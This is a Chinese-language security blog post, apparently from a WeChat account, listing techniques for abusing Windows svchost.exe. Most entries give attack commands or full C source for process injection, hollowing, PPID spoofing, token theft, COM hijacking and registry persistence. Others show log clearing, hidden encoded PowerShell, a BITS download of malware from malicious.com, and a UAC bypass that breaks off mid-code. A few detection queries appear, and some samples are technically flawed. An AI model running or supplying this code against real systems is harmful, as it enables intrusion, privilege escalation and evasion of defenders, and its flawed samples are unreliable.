#  滥用SVCHost的35种方法

Matrix SEC  [ Matrix SEC ](javascript:void\(0\);)

**Matrix SEC** ![]()

微信号 gh_d6c65ea376d7

功能介绍 矩阵安全-专注全球网络安全。威胁情报 | APT狩猎 | 漏洞情报 | Lulz

____

___发表于_

收录于合集 #渗透测试 6个

**svchost.exe是什么?**

svchost.exe是一个属于微软Windows操作系统的系统程序，它是从动态链接库(DLL)运行的服务的通用主机进程名称。

 **为什么Windows使用svchost.exe?**

  *  **内存效率:** ** ** 在单个进程中运行多个服务可以节省内存，因为每个单独的服务不需要自己的进程开销。

  *  **模块化:** 通过将服务分离到dll中，开发人员可以轻松地编写和更新单个服务，而不会影响其他服务。

  *  **安全和隔离:  **可以根据服务的隔离性和安全性需求对其进行分组。例如，需要类似安全上下文的服务可以分组到单个实例中。

  

 **常见的攻击手法**

  *  **DLL注入:  **由于宿主服务来自DLL，攻击者经常将其作为DLL注入攻击的目标，在这种攻击中，恶意DLL被加载到其进程空间中。

  *  **伪装:**  攻击者可以伪装以隐藏恶意进程活动。

  *  **内存操作:  **像傀儡进程技术可以用恶意代码替换合法代码。

  *  **服务配置操作:  **攻击者可以修改服务配置，强制加载恶意DLL或执行恶意命令。

 **1\. DLL 注入**

 **说明:** 将恶意DLL注入svchost

 **流程:** svchost.exe -> 注入恶意DLL -> 恶意活动  

  * 

    
    
    injector.exe -p svchost.exe -d malicious.dll

https://github.com/monoxgas/sRDI

 **2\. 未授权网络连接**

 **说明:  **查找SVChost

 **流程:**  svchost.exe -> 建立网络连接 -> 使用"findstr"检测 -> 识别未授权网络连接

  * 

    
    
    netstat -anob

 **3\. Process Impersonation**

 **说明:  **Mimikatz伪装svchost执行

 **流程:**  Mimikatz -> 执行命令 -> 攻击svchost.exe -> 获得svchost权限

  * 

    
    
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

 **4\. 内存转储文件**

 **说明:  **转储svchost内存

 **流程:**  svchost.exe -> 启动内存转储 -> 提取内存内容 -> 保存为转储文件

  * 

    
    
    procdump.exe -ma svchost.exe dumpfile.dmp

 **5\. 未授权创建文件**

 **说明:  **使用svchost复制恶意文件

 **流程:**  恶意文件 -> 复制操作 -> 名称为svchost.exe -> 放置在目标目录

  * 

    
    
    copy malicious.exe C:\Windows\System32\svchost.exe

 **6\. Process Hollowing**  

 **说明:  **svchost傀儡进程运行恶意代码

 **流程:**  svchost.exe -> 挂起进程 -> 空内存部分 -> 注入恶意代码 -> 使用恶意代码恢复进程

  * 

    
    
    hollow.exe svchost.exe malicious.exe

https://github.com/boku7/HOLLOW

 **7\. Process Doppelganging**

 **流程:**  恶意文件 -> 创建NTFS事件 -> 用svchost数据覆盖 ->  返回事件 -> 以svchost身份执行恶意代码

  * 

    
    
    doppel.exe svchost.exe malicious.bin

https://github.com/Spajed/processrefund

 **8\. 反射DLL注入**

 **说明:  **在不接触磁盘的情况下将 DLL 注入 svchost

 **流程:**  内存中的恶意dll -> 找到svchost.exe进程 -> 在svchost中分配内存 -> 将dll复制到分配的内存 ->
执行恶意dll -> svchost运行注入的dll

  * 

    
    
    reflective_injector.exe svchost.exe malicious.dll

https://github.com/stephenfewer/ReflectiveDLLInjection

 **9\. 线程执行劫持(Hijacking)**

 **说明:  **线程执行劫持(Thread Execution
Hijacking)是一种攻击者在进程中挂起线程并修改其指令指针(通常是x86架构上的EIP寄存器)以指向恶意代码的技术。一旦线程被恢复，它将执行恶意代码。

 **流程:**  找到svchost.exe线程 -> 挂起目标线程 -> 获取线程上下文 -> 将执行更改为恶意代码 -> 恢复线程 ->
svchost线程执行恶意代码

  * 

    
    
    hijack.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    // Simple payload that shows a message boxvoid payload() {    MessageBox(NULL, "Thread hijacked!", "Payload", MB_OK);    ExitThread(0); // Exit the thread after executing the payload}  
    int main() {    DWORD processId = 0;    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 pe;    pe.dwSize = sizeof(PROCESSENTRY32);  
        // Find the process ID of notepad.exe    if (Process32First(hSnapshot, &pe)) {        do {            if (strcmp(pe.szExeFile, "notepad.exe") == 0) {                processId = pe.th32ProcessID;                break;            }        } while (Process32Next(hSnapshot, &pe));    }    CloseHandle(hSnapshot);  
        if (processId == 0) {        printf("notepad.exe not found.\n");        return 1;    }  
        // Open the target process    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);    if (!hProcess) {        printf("Failed to open target process.\n");        return 1;    }  
        // Allocate memory in the target process for our payload    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (!pRemoteCode) {        printf("Memory allocation failed.\n");        CloseHandle(hProcess);        return 1;    }  
        // Write our payload to the target process    WriteProcessMemory(hProcess, pRemoteCode, payload, 1024, NULL);  
        // Create a thread in the target process to execute our payload    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);    if (!hThread) {        printf("Thread creation failed.\n");        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);        CloseHandle(hProcess);        return 1;    }  
        // Wait for the remote thread to finish    WaitForSingleObject(hThread, INFINITE);  
        // Cleanup    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);    CloseHandle(hThread);    CloseHandle(hProcess);  
        return 0;}

 **10\. 父进程** **欺骗(Parent PID Spoofing)**

 **说明:
**父进程ID(PPID)欺骗是一种攻击者使用与实际进程不同的父进程启动进程的技术。这可以用来绕过安全检查，因为某些安全解决方案可能信任特定受信任父进程的子进程。

 **流程:  **恶意进程 -> 创建svchost并挂起状态 -> 修改svchost的父进程PID ->恢复svchost运行 ->
svchost运行欺骗的父pid进程  

  * 

    
    
    ppid_spoof.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    DWORD targetPID; // The PID of the process you want to spoof as the parent    printf("Enter the target PID to spoof as parent: ");    scanf("%d", &targetPID);  
        HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);    if (!hTargetProcess) {        printf("Failed to open target process.\n");        return 1;    }  
        SIZE_T size;    STARTUPINFOEX siex = { sizeof(siex) };    PROCESS_INFORMATION pi;  
        // Set up the attribute list for the parent process spoofing    InitializeProcThreadAttributeList(NULL, 1, 0, &size);    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);  
        // Set the parent process to the target process    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTargetProcess, sizeof(HANDLE), NULL, NULL);  
        // Create the child process (e.g., svchost.exe)    if (!CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&siex, &pi)) {        printf("Failed to create child process.\n");        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);        CloseHandle(hTargetProcess);        return 1;    }  
        // Cleanup    CloseHandle(pi.hProcess);    CloseHandle(pi.hThread);    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);    CloseHandle(hTargetProcess);  
        return 0;}

 **11\. Token Manipulation**

 ** **说明:**** Token
Manipulation是一种攻击者从高特权进程复制令牌，然后使用该令牌启动具有高特权的新进程的技术。这通常用于权限提升攻击。

  * 

    
    
    token_manip.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    HANDLE hToken, hNewToken, hProcess;    DWORD processID;  
        // Assuming you've already obtained the PID of svchost.exe or any high-privileged process    printf("Enter the PID of the high-privileged process (e.g., svchost.exe): ");    scanf("%d", &processID);  
        // Open the target process    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);    if (!hProcess) {        printf("Failed to open target process.\n");        return 1;    }  
        // Get the process token    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {        printf("Failed to obtain process token.\n");        CloseHandle(hProcess);        return 1;    }  
        // Duplicate the token    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {        printf("Failed to duplicate token.\n");        CloseHandle(hToken);        CloseHandle(hProcess);        return 1;    }  
        // Use the duplicated token to run a new process with elevated privileges    STARTUPINFO si = { sizeof(STARTUPINFO) };    PROCESS_INFORMATION pi;    if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {        printf("Failed to create process with elevated token.\n");        CloseHandle(hNewToken);        CloseHandle(hToken);        CloseHandle(hProcess);        return 1;    }  
        // Cleanup    CloseHandle(pi.hProcess);    CloseHandle(pi.hThread);    CloseHandle(hNewToken);    CloseHandle(hToken);    CloseHandle(hProcess);  
        return 0;}

 **12\. Unhooking**

 ** **说明:
****Unhooking指的是恢复被挂钩的函数的原始字节的过程(即，它的行为已经被改变，通常是由安全软件或恶意软件)。通过解挂钩函数，可以绕过依赖于这些挂钩的监视或其他安全机制。

  * 

    
    
    unhook.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    // This is a simple representation of the first few bytes of the MessageBoxW function// in its original state. This might vary based on the Windows version and updates.unsigned char originalBytes[] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC };  
    int main() {    HMODULE hUser32 = GetModuleHandleA("user32.dll");    if (!hUser32) {        printf("Failed to get handle to user32.dll.\n");        return 1;    }  
        // Get the address of MessageBoxW    FARPROC pMessageBoxW = GetProcAddress(hUser32, "MessageBoxW");    if (!pMessageBoxW) {        printf("Failed to get address of MessageBoxW.\n");        return 1;    }  
        // Change memory protection to allow writing    DWORD oldProtect;    if (!VirtualProtect(pMessageBoxW, sizeof(originalBytes), PAGE_EXECUTE_READWRITE, &oldProtect)) {        printf("Failed to change memory protection.\n");        return 1;    }  
        // Overwrite the beginning of MessageBoxW with the original bytes    memcpy(pMessageBoxW, originalBytes, sizeof(originalBytes));  
        // Restore the original memory protection    VirtualProtect(pMessageBoxW, sizeof(originalBytes), oldProtect, &oldProtect);  
        printf("Unhooked MessageBoxW successfully.\n");  
        // Test the unhooked function    MessageBoxW(NULL, L"Unhooked MessageBox", L"Test", MB_OK);  
        return 0;}

 **13\. 代码注入(Code Injection)**

 **说明:** 代码注入(Code
Injection)是一种攻击者将恶意代码注入正在运行的进程中的技术。这可以用于各种目的，例如使用目标进程执行任意代码、逃避检测或绕过安全机制。

  * 

    
    
    code_inject.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    DWORD processID;    HANDLE hProcess;    LPVOID remoteBuffer;    char code[] = {        // ... Your shellcode goes here ...    };  
        // Assuming you've already obtained the PID of svchost.exe    printf("Enter the PID of svchost.exe: ");    scanf("%d", &processID);  
        // Open the target process    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);    if (!hProcess) {        printf("Failed to open target process.\n");        return 1;    }  
        // Allocate memory in the target process    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (!remoteBuffer) {        printf("Failed to allocate memory in target process.\n");        CloseHandle(hProcess);        return 1;    }  
        // Write the code into the target process    if (!WriteProcessMemory(hProcess, remoteBuffer, code, sizeof(code), NULL)) {        printf("Failed to write to target process memory.\n");        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);        CloseHandle(hProcess);        return 1;    }  
        // Create a remote thread to execute the code    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);    if (!hThread) {        printf("Failed to create remote thread in target process.\n");        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);        CloseHandle(hProcess);        return 1;    }  
        // Wait for the remote thread to finish    WaitForSingleObject(hThread, INFINITE);  
        // Cleanup    CloseHandle(hThread);    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);    CloseHandle(hProcess);  
        printf("Code injected successfully.\n");    return 0;}

 **14\. Process Reimaging**

 **说明:  **Process
Reimaging是一种用于操纵内存中运行进程的映像路径或命令行的技术。这可以用来隐藏恶意活动，方法是将恶意进程伪装成合法进程，例如svchost.exe。

  * 

    
    
    reimage.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>#include <winternl.h>  
    // Define the structure for process parameterstypedef struct _RTL_USER_PROCESS_PARAMETERS {    BYTE Reserved1[16];    PVOID Reserved2[10];    UNICODE_STRING ImagePathName;    UNICODE_STRING CommandLine;} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;  
    // Define the structure for process basic informationtypedef struct _PROCESS_BASIC_INFORMATION {    PVOID Reserved1;    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;    BYTE Reserved2[104];    PVOID Reserved3[5];    ULONG_PTR PEBBaseAddress;} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;  
    int main() {    DWORD processID;    HANDLE hProcess;    PROCESS_BASIC_INFORMATION pbi;    ULONG returnLength;  
        // Function pointer for NtQueryInformationProcess    typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);    pNtQueryInformationProcess NtQueryInformationProcess;  
        // Load ntdll and get the address of NtQueryInformationProcess    NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");    if (!NtQueryInformationProcess) {        printf("Failed to get address of NtQueryInformationProcess.\n");        return 1;    }  
        // Assuming you've already obtained the PID of the target process    printf("Enter the PID of the target process: ");    scanf("%d", &processID);  
        // Open the target process    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);    if (!hProcess) {        printf("Failed to open target process.\n");        return 1;    }  
        // Get the process basic information    NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);    if (status != 0) {        printf("Failed to query process information.\n");        CloseHandle(hProcess);        return 1;    }  
        // Modify the ImagePathName to mimic svchost.exe    UNICODE_STRING fakeImagePath;    fakeImagePath.Buffer = L"C:\\Windows\\System32\\svchost.exe";    fakeImagePath.Length = wcslen(fakeImagePath.Buffer) * 2;    fakeImagePath.MaximumLength = (wcslen(fakeImagePath.Buffer) * 2) + 2;  
        if (!WriteProcessMemory(hProcess, &pbi.ProcessParameters->ImagePathName, &fakeImagePath, sizeof(fakeImagePath), NULL)) {        printf("Failed to modify ImagePathName.\n");        CloseHandle(hProcess);        return 1;    }  
        printf("Successfully reimaged the process.\n");  
        // Cleanup    CloseHandle(hProcess);    return 0;}

 **15\. ATOM Bombing**

 ** **说明:  ****ATOM
Bombing是一种利用全局ATOM表的代码注入技术，ATOM表是Windows提供的用于存储字符串和相应标识符的特性。攻击者可以使用ATOM表编写恶意代码，然后强制合法进程检索并执行它。

  * 

    
    
    atom_bomb.exe svchost.exe

https://github.com/BreakingMalwareResearch/atom-bombing

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    ATOM atom;    DWORD processID;    HANDLE hProcess;    HANDLE hThread;    LPVOID remoteBuffer;  
        // Sample shellcode for demonstration purposes    char shellcode[] = {        // ... Your shellcode goes here ...    };  
        // Register the shellcode in the global ATOM table    atom = GlobalAddAtomA(shellcode);    if (!atom) {        printf("Failed to add shellcode to ATOM table.\n");        return 1;    }  
        // Assuming you've already obtained the PID of svchost.exe    printf("Enter the PID of svchost.exe: ");    scanf("%d", &processID);  
        // Open the target process    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);    if (!hProcess) {        printf("Failed to open target process.\n");        return 1;    }  
        // Allocate memory in the target process    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);    if (!remoteBuffer) {        printf("Failed to allocate memory in target process.\n");        CloseHandle(hProcess);        return 1;    }  
        // Force the target process to retrieve the shellcode from the ATOM table    if (!SendMessageA(HWND_BROADCAST, WM_GETTEXT, sizeof(shellcode), (LPARAM)remoteBuffer)) {        printf("Failed to send message to target process.\n");        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);        CloseHandle(hProcess);        return 1;    }  
        // Create a remote thread in the target process to execute the shellcode    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);    if (!hThread) {        printf("Failed to create remote thread in target process.\n");        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);        CloseHandle(hProcess);        return 1;    }  
        // Cleanup    GlobalDeleteAtom(atom);    CloseHandle(hThread);    CloseHandle(hProcess);  
        printf("ATOM Bombing successful.\n");    return 0;}

 **16\. Window Message Hooking**

 ** **说明:  ****Window Message Hooking 实现这一点的一个常用方法是使用Windows
API提供的函数。此函数允许您设置钩子子程，以便在某些类型的消息到达目标窗口子程之前监视系统。SetWindowsHookEx

  * 

    
    
    hookmsg.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    // Global variablesHINSTANCE hInstance;HHOOK hHook;  
    // Hook procedureLRESULT CALLBACK MessageHookProc(int nCode, WPARAM wParam, LPARAM lParam) {    if (nCode >= 0) {        // Intercept messages here        MSG *msg = (MSG *)lParam;        if (msg->message == WM_SOME_MESSAGE) { // Replace WM_SOME_MESSAGE with a real message identifier            // Handle or modify the message            printf("Intercepted a window message!\n");        }    }    return CallNextHookEx(hHook, nCode, wParam, lParam);}  
    BOOL SetHook() {    hHook = SetWindowsHookEx(WH_GETMESSAGE, MessageHookProc, hInstance, 0);    return (hHook != NULL);}  
    BOOL UnsetHook() {    return UnhookWindowsHookEx(hHook);}  
    int main() {    hInstance = GetModuleHandle(NULL);  
        if (!SetHook()) {        printf("Failed to set hook.\n");        return 1;    }  
        printf("Hook set successfully. Press any key to unhook...\n");    getchar();  
        if (!UnsetHook()) {        printf("Failed to unset hook.\n");        return 1;    }  
        printf("Hook unset successfully.\n");    return 0;}

 **17\. COM Hijacking**

 ** **说明:
****COM(组件对象模型)劫持是一种持久性技术，攻击者通过操纵注册表项来重定向或拦截对合法COM对象的调用。这可用于在调用特定COM对象时执行恶意代码。

  * 

    
    
    com_hijack.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    // CLSID of a legitimate COM object (for demonstration purposes only)// You should replace this with a real CLSID#define TARGET_CLSID L"{12345678-1234-1234-1234-123456789012}"  
    // Path to the malicious DLL that will be invoked instead of the legitimate COM object#define MALICIOUS_DLL_PATH L"C:\\path\\to\\malicious.dll"  
    BOOL SetCOMHijack() {    HKEY hKey;    LONG lResult;    WCHAR szKeyPath[256];  
        // Construct the registry key path    wsprintf(szKeyPath, L"Software\\Classes\\CLSID\\%s\\InprocServer32", TARGET_CLSID);  
        // Open or create the registry key    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);    if (lResult != ERROR_SUCCESS) {        return FALSE;    }  
        // Set the default value to the path of the malicious DLL    lResult = RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)MALICIOUS_DLL_PATH, (wcslen(MALICIOUS_DLL_PATH) + 1) * sizeof(WCHAR));    RegCloseKey(hKey);  
        return (lResult == ERROR_SUCCESS);}  
    int main() {    if (SetCOMHijack()) {        printf("COM Hijacking set successfully.\n");    } else {        printf("Failed to set COM Hijacking.\n");    }    return 0;}

 **18\. 动态数据交换(Dynamic Data Exchange)**

 ** **说明:  ****动态数据交换(Dynamic Data
Exchange)是一种较旧的进程间通信系统，它允许两个运行的应用程序共享相同的数据。DDE可以被滥用来执行任意命令，过去它已被用作Microsoft
Office文档中的命令执行方法。

  * 

    
    
    dde_attack.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    // DDE requires a window to be created for message handling    HWND hwnd = CreateWindowEx(0, "STATIC", "DDE Command Execution", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);    if (!hwnd) {        printf("Failed to create window for DDE.\n");        return 1;    }  
        // Initialize DDE    UINT uDDEInit = DdeInitialize(NULL, NULL, APPCLASS_STANDARD | APPCMD_CLIENTONLY, 0);    if (uDDEInit != DMLERR_NO_ERROR) {        printf("Failed to initialize DDE.\n");        return 1;    }  
        // Connect to a DDE service (e.g., Excel)    HSZ hszService = DdeCreateStringHandle(uDDEInit, "Excel", CP_WINANSI);    HSZ hszTopic = DdeCreateStringHandle(uDDEInit, "System", CP_WINANSI);    HCONV hConv = DdeConnect(uDDEInit, hszService, hszTopic, NULL);  
        if (!hConv) {        printf("Failed to connect to DDE service.\n");        DdeUninitialize(uDDEInit);        return 1;    }  
        // Execute a command via DDE (for demonstration purposes, let's open Calculator)    HSZ hszCommand = DdeCreateStringHandle(uDDEInit, "[EXEC(\"calc.exe\")]", CP_WINANSI);    if (!DdeClientTransaction(NULL, 0, hConv, hszCommand, CF_TEXT, XTYP_EXECUTE, TIMEOUT_ASYNC, NULL)) {        printf("Failed to execute DDE command.\n");    }  
        // Cleanup    DdeFreeStringHandle(uDDEInit, hszService);    DdeFreeStringHandle(uDDEInit, hszTopic);    DdeFreeStringHandle(uDDEInit, hszCommand);    DdeDisconnect(hConv);    DdeUninitialize(uDDEInit);    DestroyWindow(hwnd);  
        return 0;}

 **19\. PowerShell Injection**

 ** **说明:  ****通过svchost注入PowerShell命令

  * 

    
    
    powershell -encodedCommand [Base64Code]

 **20\. 环境变量覆盖(Environment Variable Override)**

  *   *   * 

    
    
     set COMPLUS_Version=v4.0.30319 && svchost.exe  
    process.name: "cmd.exe" AND process.args: "set" AND process.args: "COMPLUS_Version"

 **21\. 映像文件执行选项注入**

  *   *   * 

    
    
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v Debugger /t REG_SZ /d "malicious.exe"  
    process.name: "reg.exe" AND process.args: "Image File Execution Options" AND process.args: "svchost.exe"

 **22\. WMI事件订阅**

  * 

    
    
     wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="evilFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

 **23\. ETW Hijacking**

 **说明:**
Windows事件跟踪(ETW)是Windows提供的一个功能强大的跟踪工具，用于记录和监视系统和应用程序的行为。ETW提供者是生成要跟踪的事件的组件。劫持或滥用ETW提供程序可以允许攻击者监视特定事件，从而潜在地了解系统行为或用户操作。

  * 

    
    
    etw_hijack.exe svchost.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <evntcons.h>#include <evntrace.h>  
    // Callback for processing eventsvoid WINAPI EventRecordCallback(EVENT_RECORD* pEventRecord) {    if (pEventRecord->EventHeader.EventDescriptor.Id == 10 /* Process Start Event ID */) {        // Extract process name and check if it's svchost.exe        // This is a simplification; in a real-world scenario, you'd need to parse the event data        if (strstr((char*)pEventRecord->UserData, "svchost.exe")) {            printf("svchost.exe started!\n");        }    }}  
    int main() {    TRACEHANDLE hTrace = 0;    EVENT_TRACE_LOGFILE traceLog = { 0 };    traceLog.LoggerName = KERNEL_LOGGER_NAME;    traceLog.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME;    traceLog.EventRecordCallback = (PEVENT_RECORD_CALLBACK)EventRecordCallback;  
        hTrace = OpenTrace(&traceLog);    if (hTrace == INVALID_PROCESSTRACE_HANDLE) {        printf("Failed to open trace.\n");        return 1;    }  
        ULONG status = ProcessTrace(&hTrace, 1, 0, 0);    if (status != ERROR_SUCCESS) {        printf("Failed to process trace.\n");        CloseTrace(hTrace);        return 1;    }  
        CloseTrace(hTrace);    return 0;}

 **24\. AppInit_DLLs  Injection**

  *   *   * 

    
    
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "malicious.dll"  
    process.name: "reg.exe" AND process.args: "AppInit_DLLs"

 **25\. Global Flags Override**

  * 

    
    
     gflags.exe /p /enable svchost.exe /full

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    HKEY hKey;    DWORD dwFlags = 0x2;  // FLG_HEAP_ENABLE_TAIL_CHECK, as an example  
        // Open the Image File Execution Options key for svchost.exe    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {        printf("Failed to open registry key.\n");        return 1;    }  
        // Set the global flag    if (RegSetValueEx(hKey, "GlobalFlag", 0, REG_DWORD, (BYTE*)&dwFlags, sizeof(dwFlags)) != ERROR_SUCCESS) {        printf("Failed to set GlobalFlag.\n");        RegCloseKey(hKey);        return 1;    }  
        printf("GlobalFlag set successfully for svchost.exe.\n");  
        // Cleanup    RegCloseKey(hKey);    return 0;}

 **26\. 注册表持久化**

 **说明:**  通过注册表添加持久性，以便在启动时运行恶意svchost

  *   *   * 

    
    
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousService" /t REG_SZ /d "svchost.exe -k netsvcs -p malicious.dll"  
    process.name: "reg.exe" AND process.args: "CurrentVersion\Run" AND process.args: "svchost.exe"

 **27\. 服务劫持(Service Hijacking)**

 **说明:  **使用svchost创建恶意服务

  * 

    
    
    sc create MaliciousService binPath= "svchost.exe -k netsvcs -p malicious.dll"

 **28\. 计划任务**

 ** **说明:  ****创建定时任务运行恶意svchost

  * 

    
    
    schtasks /create /tn "MaliciousTask" /tr "svchost.exe -k netsvcs -p malicious.dll"

 **29\. 事件日志篡改**

 ** ** **说明:  ******清除事件日志以隐藏svchost

  * 

    
    
    wevtutil cl System

 **30\. 无文件恶意软件执行**

 ** ** **说明:  ******在svchost中通过PowerShell执行无文件恶意软件

  * 

    
    
    powershell.exe -nop -w hidden -encodedCommand [Base64Code]

 **31\. 替换数据流执行**

  * 

    
    
     cmd.exe /c start svchost.exe:malicious.exe

 **32\. BITS**

  * 

    
    
     bitsadmin /create /download /priority foreground MaliciousJob http://malicious.com/malware.exe C:\Windows\System32\svchost_malware.exe

 **33\. UAC Bypass**

 ** ** ** **说明:
********绕过用户帐户控制(UAC)是恶意软件用来在不提示用户的情况下提升权限的常用技术。有许多方法可以绕过UAC，其中许多方法利用了Windows组件中的特定行为或漏洞。一个众所周知的方法包括利用fodhelper.exe二进制文件，这是Windows的一部分功能需求。

  * 

    
    
    fodhelper.exe

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    #include <windows.h>#include <stdio.h>  
    int main() {    HKEY hKey;    char cmd[] = "C:\\Windows\\System32\\cmd.exe";  // Command to be executed with elevated privileges  
